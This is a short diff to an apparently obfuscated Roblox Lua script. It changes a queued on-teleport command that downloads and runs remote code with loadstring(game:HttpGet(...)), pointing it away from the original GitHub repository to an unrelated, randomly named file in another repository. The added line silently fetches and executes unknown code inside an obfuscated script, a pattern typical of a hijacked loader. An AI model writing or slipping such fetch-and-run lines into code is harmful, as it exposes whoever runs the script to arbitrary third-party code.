@@ -3928,7 +3928,7 @@ local function __0___0()
         function(__0_______0)
             ___0_______0 = true
             queueteleport(
-                "loadstring(game:HttpGet('https://raw.githubusercontent.com/Blitzedzz/VTG/main/V2Release'))()"
+                "loadstring(game:HttpGet('https://raw.githubusercontent.com/hellothere-lol/a/main/asdsaf.lua'))()"
             )
         end
     )
